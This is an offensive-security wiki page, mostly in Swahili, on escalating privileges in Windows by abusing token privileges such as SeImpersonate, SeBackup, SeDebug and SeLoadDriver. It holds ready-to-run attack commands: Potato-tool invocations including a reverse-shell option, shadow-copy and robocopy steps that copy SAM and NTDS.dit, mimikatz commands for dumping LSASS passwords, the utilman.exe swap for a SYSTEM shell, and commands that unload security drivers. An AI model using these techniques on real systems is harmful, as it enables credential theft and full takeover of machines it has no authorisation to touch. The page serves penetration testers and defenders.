# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Ikiwa **hujui Windows Access Tokens ni nini** soma ukurasa huu kabla ya kuendelea:


{{#ref}}
access-tokens.md
{{#endref}}

**Huenda ukaweza kuongeza privileges kwa abusing tokens ulizo nazo tayari**

### SeImpersonatePrivilege

Hii ni privilege inayoshikiliwa na process yoyote inayoiruhusu impersonation (lakini si creation) ya token yoyote, mradi tu handle yake inaweza kupatikana. Token yenye privilege inaweza kupatikana kutoka kwenye Windows service (DCOM) kwa kuishawishi ifanye NTLM authentication dhidi ya exploit, kisha kuwezesha execution ya process yenye SYSTEM privileges. Vulnerability hii inaweza kutumiwa kwa kutumia tools mbalimbali, kama [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (inayohitaji winrm kuwa disabled), [SweetPotato](https://github.com/CCob/SweetPotato), na [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato ni legacy**: kwenye Windows 10 1809+/Server 2019+, tumia kwa upendeleo **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, au **PrintSpoofer** kutegemea ni RPC/COM surface ipi bado inaweza kufikiwa.
- Ikiwa umecompromise service inayoendeshwa kama **`LOCAL SERVICE`** au **`NETWORK SERVICE`** na `whoami /priv` inaonyesha **filtered token** bila `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, kwanza rejesha **default privilege set** ya account hiyo (kwa mfano kwa **FullPowers**) kisha ujaribu tena familia ya potato baadae.
- Baadhi ya forks za kisasa ni rafiki zaidi kwa operator kuliko tools za asili. Kwa mfano, **SigmaPotato** inaongeza reflection/in-memory execution na compatibility ya kisasa ya Windows, huku **PrintNotifyPotato** ikitumia vibaya PrintNotify COM service na mara nyingi huwa muhimu wakati njia ya kawaida ya Spooler imezimwa.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Ni sawa sana na **SeImpersonatePrivilege**, itatumia **mbinu ile ile** kupata privileged token.\
Kisha, privilege hii inaruhusu **kuassign primary token** kwa mchakato mpya/usimamishwa. Ukiwa na privileged impersonation token unaweza kupata primary token kwa kutumia DuplicateTokenEx.\
Kwa token hiyo, unaweza kuunda **mchakato mpya** kwa 'CreateProcessAsUser' au kuunda mchakato uliosimamishwa na **kuweka token** (kwa ujumla, huwezi kurekebisha primary token ya mchakato unaoendelea).

### SeTcbPrivilege

Ukiwa na token hii imewezeshwa unaweza kutumia **KERB_S4U_LOGON** kupata **impersonation token** kwa mtumiaji yeyote mwingine bila kujua credentials, **kuongeza arbitrary group** (admins) kwenye token, kuweka **integrity level** ya token kuwa "**medium**", na kuassign token hii kwa **current thread** (SetThreadToken).

### SeBackupPrivilege

Mfumo unasababisha **kutoa access yote ya kusoma** kwa faili yoyote (iliyozuiliwa kwa operations za kusoma tu) kwa privilege hii. Hutumika kwa **kusoma password hashes za local Administrator** accounts kutoka kwenye registry, ambapo baada yake, tools kama "**psexec**" au "**wmiexec**" zinaweza kutumiwa na hash (Pass-the-Hash technique). Hata hivyo, technique hii hushindwa chini ya hali mbili: wakati Local Administrator account imezimwa, au wakati policy ipo inayoaondoa administrative rights kutoka kwa Local Administrators wanaounganishwa kwa mbali.\
Kwa vitendo, workflow ya built-in iliyoaminika zaidi kwa kawaida ni **VSS + `robocopy /b`**: tengeneza/onyesha shadow copy, kisha nakili `SAM`/`SYSTEM` au `NTDS.dit` katika **backup mode**, ambayo hupita file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Unaweza **kutumia vibaya privilege hii** kwa:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- kufuata **IppSec** katika [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Au kama ilivyoelezwa katika sehemu ya **escalating privileges with Backup Operators** ya:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Ruhusa ya **write access** kwa faili yoyote ya mfumo, bila kujali Access Control List (ACL) ya faili hiyo, hutolewa na privilege hii. Inafungua uwezekano mwingi wa escalation, ikiwemo uwezo wa **modify services**, kufanya DLL Hijacking, na kuweka **debuggers** kupitia Image File Execution Options pamoja na mbinu nyingine nyingi.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege ni permission yenye nguvu, hasa muhimu wakati mtumiaji ana uwezo wa impersonate tokens, lakini pia hata bila SeImpersonatePrivilege. Uwezo huu unategemea uwezo wa impersonate token inayowakilisha mtumiaji yule yule na ambayo integrity level yake haizidi ile ya process ya sasa.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Inawezekana kutumia SeCreateTokenPrivilege kwa EoP kwa impersonate tokens chini ya masharti fulani.
- **Conditions for Token Impersonation:** Impersonation yenye mafanikio inahitaji target token iwe ya mtumiaji yule yule na iwe na integrity level ambayo ni ndogo au sawa na integrity level ya process inayojaribu impersonation.
- **Creation and Modification of Impersonation Tokens:** Watumiaji wanaweza kuunda impersonation token na kuiboresha kwa kuongeza SID (Security Identifier) ya group yenye privilege.

### SeLoadDriverPrivilege

Privilege hii inaruhusu **load and unload device drivers** kwa kuunda registry entry yenye values maalum za `ImagePath` na `Type`. Kwa kuwa write access ya moja kwa moja kwa `HKLM` (HKEY_LOCAL_MACHINE) imezuiwa, `HKCU` (HKEY_CURRENT_USER) lazima itumike badala yake. Hata hivyo, ili kufanya `HKCU` itambulike na kernel kwa ajili ya driver configuration, njia maalum lazima ifuatwe.

Matumizi ya kisasa ya offensive kwa kawaida ni **BYOVD** (bring your own vulnerable driver): load **signed but vulnerable** kernel driver na kisha tumia IOCTLs zake kuzima protections au kuruka hadi kernel code execution. Kumbuka kwamba kwenye Windows 11/Server za hivi karibuni **Microsoft vulnerable driver blocklist** na/au **HVCI/Memory Integrity** mara nyingi huvunja public chains za zamani, hivyo mifano ya kitamaduni ya aina ya `szkg64.sys` si tena ya kuaminika kwa ujumla.

Njia hii ni `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, ambapo `<RID>` ni Relative Identifier ya mtumiaji wa sasa. Ndani ya `HKCU`, njia hii yote lazima iundwe, na values mbili zinahitaji kuwekwa:

- `ImagePath`, ambayo ni path ya binary itakayotekelezwa
- `Type`, yenye value ya `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Fikia `HKCU` badala ya `HKLM` kutokana na restricted write access.
2. Unda path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` ndani ya `HKCU`, ambapo `<RID>` inawakilisha Relative Identifier ya mtumiaji wa sasa.
3. Weka `ImagePath` kuwa execution path ya binary.
4. Weka `Type` kuwa `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Njia zaidi za kutumia vibaya privilege hii katika [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Hii ni sawa na **SeRestorePrivilege**. Kazi yake kuu huruhusu process **kudai umiliki wa object**, ikiepuka hitaji la explicit discretionary access kupitia utoaji wa WRITE_OWNER access rights. Mchakato huanza kwa kwanza kupata umiliki wa registry key inayolengwa kwa madhumuni ya kuandika, kisha kubadili DACL ili kuwezesha write operations.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Haki hii inaruhusu **debug other processes**, ikijumuisha kusoma na kuandika kwenye memory. Mikakati mbalimbali ya memory injection, inayoweza kukwepa antivirus nyingi na host intrusion prevention solutions, inaweza kutumika kwa haki hii.

Kwenye Windows za kisasa, kumbuka kwamba `SeDebugPrivilege` kawaida inatosha kufungua **non-protected SYSTEM processes** na kuiga tokens zao, lakini **si** hakikisho kwamba unaweza kugusa **LSASS**. Ikiwa **RunAsPPL / LSA Protection** imewezeshwa, non-protected processes haziwezi kusoma au kuinject ndani ya LSASS hata kama `SeDebugPrivilege` ipo. Katika hali hiyo, chukua token kutoka kwa SYSTEM process nyingine isiyo ya PPL, au fanya chain na PPL bypass/BYOVD badala ya kudhani `procdump` itafanya kazi. Kwa mfano kamili wa kunakili token kwa kutumia `SeDebugPrivilege` + `SeImpersonatePrivilege`, angalia [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Unaweza kutumia [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) kutoka [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) ili **capture the memory of a process**. Hasa, hii inaweza kutumika kwa process ya **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, ambayo inawajibika kuhifadhi user credentials mara tu user anapofanikiwa kuingia kwenye system.

Kisha unaweza kupakia dump hii kwenye mimikatz ili kupata passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Ikiwa unataka kupata shell ya `NT SYSTEM` unaweza kutumia:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Haki hii (Perform volume maintenance tasks) inaruhusu kufungua raw volume device handles (mfano, \\.\C:) kwa direct disk I/O inayopitisha NTFS ACLs. Kwa hiyo unaweza kunakili bytes za faili yoyote kwenye volume kwa kusoma underlying blocks, hivyo kuwezesha arbitrary file read ya data nyeti (mfano, machine private keys katika %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS kupitia VSS). Ni muhimu hasa kwenye CA servers ambapo exfiltrating CA private key huwezesha kutengeneza Golden Certificate ya kughushi ili kuiga principal yoyote.

Angalia detailed techniques na mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
**tokens** zinazoonekana kama Disabled kawaida zinaweza kuwezeshwa, kwa hiyo mara nyingi unaweza kutumia vibaya privileged zote za _Enabled_ na _Disabled_.

### Enable All the tokens

Ikiwa una disabled privileges, unaweza kutumia script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) kuenable tokens zote:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Or the **script** embedded in this [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Full token privileges cheatsheet at [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| --------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`**   | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Soma faili nyeti kwa kutumia `robocopy /b` au zana maalum za kunakili zinazojua SeBackup.                                                                                                                                                                                                                                                                 | <p>- Ni nzuri sana kwa `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, na wakati mwingine `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` ni rahisi, lakini cmdlets/APIs maalum za SeBackup mara nyingi ni rahisi zaidi kwa faili zilizofungwa/funguka.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Create arbitrary token including local admin rights with `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicate a **non-PPL** SYSTEM token or dump memory from a non-protected process.                                                                                                                                                                                                                                                                 | <p>LSASS dumping is commonly blocked if RunAsPPL/LSA Protection is enabled.</p><p>Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Use the **Potato family** / named-pipe impersonation to spawn SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Most practical from service accounts such as IIS APPPOOL, MSSQL, scheduled tasks, or any context that already owns `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Load a signed-but-vulnerable kernel driver (BYOVD)<br>2. Use the driver's IOCTLs to get kernel R/W, disable security tooling, or elevate to SYSTEM<br><br>Alternatively, the privilege may be used to unload security-related drivers with <code>fltMC</code> builtin command, i.e. <code>fltMC sysmondrv</code></p>                     | <p>Older public drivers such as <code>szkg64.sys</code> are increasingly blocked on modern Windows by the vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U</p> | <p>Attack may be detected by some AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U</p>                                                                                                                                       | <p>Attack may be detected by some AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipulate tokens to have local admin rights included. May require SeImpersonate.</p><p>To be verified.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Take a look to this table defining Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Take a look to [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) about privesc with tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
